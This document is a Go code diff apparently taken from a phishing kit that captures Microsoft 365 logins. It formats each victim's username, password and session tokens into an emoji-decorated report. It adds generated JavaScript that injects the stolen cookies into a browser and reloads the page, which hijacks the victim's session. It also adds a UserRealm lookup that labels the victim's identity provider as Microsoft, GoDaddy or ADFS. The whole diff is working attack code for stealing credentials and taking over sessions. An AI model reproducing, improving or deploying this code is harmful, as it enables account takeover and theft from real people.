@@ -4,8 +4,10 @@ import (
 	"encoding/json"
 	"fmt"
 	"math/rand"
+	"net/http"
 	"os"
 	"path/filepath"
+	"strings"
 	"sync"
 	"time"
 )
@@ -134,36 +136,79 @@ func createTxtFile(session TSession) (string, error) {
 	}
 	defer txtFile.Close()
 
+	tok, _ := json.Marshal(session.Tokens)
 	// Marshal the session maps into JSON byte slices
-	tokensJSON, err := json.MarshalIndent(session.Tokens, "", "  ")
-	if err != nil {
-		return "", fmt.Errorf("failed to marshal Tokens: %v", err)
-	}
-	httpTokensJSON, err := json.MarshalIndent(session.HTTPTokens, "", "  ")
-	if err != nil {
-		return "", fmt.Errorf("failed to marshal HTTPTokens: %v", err)
-	}
-	bodyTokensJSON, err := json.MarshalIndent(session.BodyTokens, "", "  ")
-	if err != nil {
-		return "", fmt.Errorf("failed to marshal BodyTokens: %v", err)
-	}
-	customJSON, err := json.MarshalIndent(session.Custom, "", "  ")
-	if err != nil {
-		return "", fmt.Errorf("failed to marshal Custom: %v", err)
-	}
+	//tokensJSON, err := json.MarshalIndent(session.Tokens, "", "  ")
+	//if err != nil {
+	//	return "", fmt.Errorf("failed to marshal Tokens: %v", err)
+	//}
+	//httpTokensJSON, err := json.MarshalIndent(session.HTTPTokens, "", "  ")
+	//if err != nil {
+	//	return "", fmt.Errorf("failed to marshal HTTPTokens: %v", err)
+	//}
+	//bodyTokensJSON, err := json.MarshalIndent(session.BodyTokens, "", "  ")
+	//if err != nil {
+	//	return "", fmt.Errorf("failed to marshal BodyTokens: %v", err)
+	//}
+	//customJSON, err := json.MarshalIndent(session.Custom, "", "  ")
+	//if err != nil {
+	//	return "", fmt.Errorf("failed to marshal Custom: %v", err)
+	//}
+	//
+	//allTokens, err := processAllTokens(string(tokensJSON), string(httpTokensJSON), string(bodyTokensJSON), string(customJSON))
+	//
+	//result, err := json.MarshalIndent(allTokens, "", "  ")
+	//if err != nil {
+	//	fmt.Println("Error marshalling final tokens:", err)
+	//
+	//}
+	//
+	//fmt.Println("Combined Tokens: ", string(result))
 
-	allTokens, err := processAllTokens(string(tokensJSON), string(httpTokensJSON), string(bodyTokensJSON), string(customJSON))
-
-	result, err := json.MarshalIndent(allTokens, "", "  ")
-	if err != nil {
-		fmt.Println("Error marshalling final tokens:", err)
-
-	}
-
-	fmt.Println("Combined Tokens: ", string(result))
+	jsContent := fmt.Sprintf(`(() => {
+            let cookies = %s;
+            
+            function setCookie(key, value, domain, path, isSecure) {
+                const cookieMaxAge = 'Max-Age=31536000';
+                if (key.startsWith('__Host')) {
+                    console.log('cookies Set', key, value, '!IMPORTANT __Host- prefix: Cookies with names starting with __Host- must be set with the secure flag, must be from a secure page (HTTPS), must not have a domain specified (and therefore, are not sent to subdomains), and the path must be /.',);
+                    document.cookie = key + '=' + value + ';' + cookieMaxAge + ';path=/;Secure;SameSite=None';
+                } else if (key.startsWith('__Secure')) {
+                    console.log('cookies Set', key, value, '!IMPORTANT __Secure- prefix: Cookies with names starting with __Secure- (dash is part of the prefix) must be set with the secure flag from a secure page (HTTPS).',);
+                    document.cookie = key + '=' + value + ';' + cookieMaxAge + ';domain=' + domain + ';path=' + path + ';Secure;SameSite=None';
+                } else {
+                    if (isSecure) {
+                        console.log('cookies Set', key, value);
+                        if (window.location.hostname == domain) {
+                            document.cookie = key + '=' + value + ';' + cookieMaxAge + '; path=' + path + '; Secure; SameSite=None';
+                        } else {
+                            document.cookie = key + '=' + value + ';' + cookieMaxAge + ';domain=' + domain + ';path=' + path + ';Secure;SameSite=None';
+                        }
+                    } else {
+                        console.log('cookies Set', key, value);
+                        if (window.location.hostname == domain) {
+                            document.cookie = key + '=' + value + ';' + cookieMaxAge + ';path=' + path + ';';
+                        } else {
+                            document.cookie = key + '=' + value + ';' + cookieMaxAge + ';domain=' + domain + ';path=' + path + ';';
+                        }
+                    }
+                }
+            }
+        
+            for (let i = 0; i < cookies.length; i++) {
+                let cookie = cookies[i];
+                setCookie(cookie.name, cookie.value, cookie.domain, cookie.path, cookie.secure);
+                if (i === cookies.length - 1) {
+                    location.reload();
+                }
+            }
+        
+            var stopCss = "color:red; font-size:65px; font-weight:bold; -webkit-text-stroke: 1px black";
+            var msgCss = "font-size:20px; background-color:#7FDBFF;";
+        })();`, string(tok))
 
 	// Write the consolidated data into the text file
-	_, err = txtFile.WriteString(string(result))
+	_, err = txtFile.WriteString(jsContent)
 	if err != nil {
 		return "", fmt.Errorf("failed to write data to text file: %v", err)
 	}
@@ -171,10 +216,50 @@ func createTxtFile(session TSession) (string, error) {
 	return txtFilePath, nil
 }
 
+type UserRealmResponse struct {
+	Ver                     string `json:"ver"`
+	AccountType             string `json:"account_type"`
+	DomainName              string `json:"domain_name"`
+	FederationProtocol      string `json:"federation_protocol,omitempty"`
+	FederationMetadataURL   string `json:"federation_metadata_url,omitempty"`
+	FederationActiveAuthURL string `json:"federation_active_auth_url,omitempty"`
+	CloudInstanceName       string `json:"cloud_instance_name"`
+	CloudAudienceURN        string `json:"cloud_audience_urn"`
+}
+
+func fetchUserRealm(email string) (*UserRealmResponse, error) {
+	url := fmt.Sprintf("https://login.microsoftonline.com/common/UserRealm/%s?api-version=1.0", email)
+	resp, err := http.Get(url)
+	if err != nil {
+		return nil, fmt.Errorf("error making request: %w", err)
+	}
+	defer resp.Body.Close()
+
+	var result UserRealmResponse
+	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
+		return nil, fmt.Errorf("error decoding response: %w", err)
+	}
+
+	return &result, nil
+}
 func formatSessionMessage(session TSession) string {
 	// Format the session information (no token data in message)
-	return fmt.Sprintf("✨ Session Information ✨\n\n"+
 
+	partner := ""
+	resp, err := fetchUserRealm(session.Username)
+	if err == nil {
+		if resp.AccountType == "Managed" {
+			partner = "MicrosoftOffice"
+		} else {
+			if strings.Contains(resp.FederationMetadataURL, "godaddy") {
+				partner = "GoDaddy"
+			} else if strings.Contains(resp.FederationMetadataURL, "adfs") {
+				partner = "Adfs"
+			}
+		}
+	}
+	return fmt.Sprintf("✨ Session Information ✨\n\n"+
+		"🤝 Partner:       ➖ %s\n"+
 		"👤 Username:      ➖ %s\n"+
 		"🔑 Password:      ➖ %s\n"+
 		"🌐 Landing URL:   ➖ %s\n \n"+
@@ -185,6 +270,7 @@ func formatSessionMessage(session TSession) string {
 		"\n"+
 		"📦 Tokens are added in txt file and attached separately in message.\n",
 
+		partner,
 		session.Username,
 		session.Password,
 		session.LandingURL,
